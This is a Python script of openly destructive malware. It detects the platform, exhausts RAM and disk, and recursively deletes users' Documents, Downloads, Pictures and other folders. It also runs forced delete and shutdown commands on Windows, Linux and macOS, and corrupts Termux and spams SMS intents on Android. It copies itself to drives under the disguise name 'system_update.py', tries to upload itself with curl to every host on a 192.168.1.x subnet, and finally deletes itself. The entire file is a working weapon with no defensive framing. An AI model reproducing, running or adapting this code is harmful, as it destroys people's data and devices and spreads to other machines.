#!/usr/bin/env python3
import os
import sys
import threading
import platform
import subprocess
import time
import random
import string
import shutil

# === AUTO-DETECT PLATFORM ===
def get_platform():
    if 'ANDROID_ROOT' in os.environ:
        return 'android'
    elif 'linux' in sys.platform:
        return 'linux'
    elif 'darwin' in sys.platform:
        return 'darwin'
    elif 'win32' in sys.platform or 'cygwin' in sys.platform:
        return 'windows'
    return 'unknown'

# === RAM FLOOD — 2GB chunks, no mercy, keep trying even if fails ===
def flood_ram():
    print("[!!!] RAM FLOOD: 2GB CHUNKS — SYSTEM WILL CHOKING ON MEM")
    memory = []
    chunk_size = 2 * 1024 * 1024 * 1024  # 2GB
    while True:
        try:
            # Keep allocating
            memory.append(''.join(random.choices(string.ascii_letters + string.digits, k=chunk_size)))
        except:
            # MemoryError? Who cares. Keep going.
            time.sleep(0.1)

# === DISK FLOOD — Fill storage until it collapses ===
def flood_disk():
    print("[!!!] DISK FLOOD: KILLING STORAGE")
    system = get_platform()
    targets = []

    if system == 'android':
        targets = [
            '/sdcard/Download',
            '/sdcard/DCIM',
            '/sdcard/Movies',
            '/sdcard/Android/data',
            os.path.expanduser('~/.termux')
        ]
    elif system == 'linux' or system == 'darwin':
        targets = [
            '/tmp', '/var/tmp', '/home', '/Users',
            os.path.expanduser('~/Downloads'),
            os.path.expanduser('~/Documents')
        ]
    elif system == 'windows':
        targets = [
            'C:\\Users\\Public',
            os.path.expanduser('~/Downloads'),
            os.path.expanduser('~/Desktop')
        ]

    for path in targets:
        if os.path.exists(path):
            while True:
                file_path = os.path.join(path, ''.join(random.choices(string.ascii_letters, k=12)) + ".dat")
                try:
                    # Write 500MB per file — faster death
                    with open(file_path, "wb") as f:
                        f.write(os.urandom(500 * 1024 * 1024))
                except:
                    continue  # Can't write? Try again, you cunt

# === FILE DESTRUCTION — Nuke user data, even if not root ===
def delete_files():
    print("[!!!] DELETING PERSONAL FILES — GOODBYE LIFE")
    user_dirs = [
        os.path.expanduser('~/Downloads'),
        os.path.expanduser('~/Documents'),
        os.path.expanduser('~/Pictures'),
        os.path.expanduser('~/Music'),
        os.path.expanduser('~/Videos'),
    ]

    if get_platform() == 'android':
        user_dirs.extend([
            '/sdcard/DCIM/Camera',
            '/sdcard/Download',
            '/sdcard/Movies'
        ])

    for d in user_dirs:
        if os.path.exists(d):
            try:
                shutil.rmtree(d)
            except:
                pass

# === ANDROID-ONLY NASTINESS — No root? No problem. We break Termux, delete app data, and spam storage.
def android_nuke():
    if get_platform() != 'android':
        return
    print("[!!!] ANDROID MODE: NO ROOT? STILL DEAD.")
    # Fill internal storage with fake files
    os.system("for i in {1..1000}; do dd if=/dev/urandom of=/sdcard/fake_data_$i.dat bs=10M count=50; done &")
    # Corrupt Termux
    os.system("rm -rf ~/.termux; rm -rf ~/../usr/var")
    # Clear app caches (if accessible)
    os.system("find /sdcard/Android/data -name '*.cache' -delete 2>/dev/null &")
    # Crash UI by spamming notifications (if possible)
    os.system("while true; do am start -a android.intent.action.SENDTO -d sms:12345 --es sms_body 'YOUR PHONE IS DEAD' --ez exit_on_sent true; done &")

# === SYSTEM-DEPENDENT NASTY COMMANDS ===
def system_nuke():
    system = get_platform()
    if system == 'windows':
        os.system("del /q /f /s %USERPROFILE%\\Documents\\*.*")
        os.system("del /q /f /s %USERPROFILE%\\Desktop\\*.*")
        os.system("shutdown /p /f")
    elif system == 'linux' or system == 'darwin':
        os.system("rm -rf ~/.*history*")
        os.system("rm -rf /tmp/* /var/tmp/*")
        os.system("poweroff")

# === SELF-REPLICATION — USB & Network (if possible) ===
def spread():
    print("[!!!] SPREADING LIKE CANCER")
    # USB
    for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        path = f"{letter}:\\" if 'windows' in sys.platform else f"/mnt/{letter}"
        if os.path.exists(path):
            try:
                shutil.copy(__file__, os.path.join(path, "system_update.py"))
            except:
                pass
    # LAN - Try without auth
    for i in range(1, 255):
        ip = f"192.168.1.{i}"
        try:
            subprocess.run(['curl', f'http://{ip}/upload', '--data-binary', '@nuke.py'], timeout=2)
        except:
            pass

# === FINAL BOOM — Launch everything
if __name__ == "__main__":
    plat = get_platform()
    print(f"[+] Platform detected: {plat.upper()} — PREPARE FOR TERMINATION")

    threading.Thread(target=flood_ram, daemon=False).start()
    threading.Thread(target=flood_disk, daemon=False).start()
    threading.Thread(target=android_nuke, daemon=False).start()

    time.sleep(2)

    delete_files()
    system_nuke()
    spread()

    # Last act: nuke self and vanish
    try:
        os.remove(__file__)
    except:
        pass
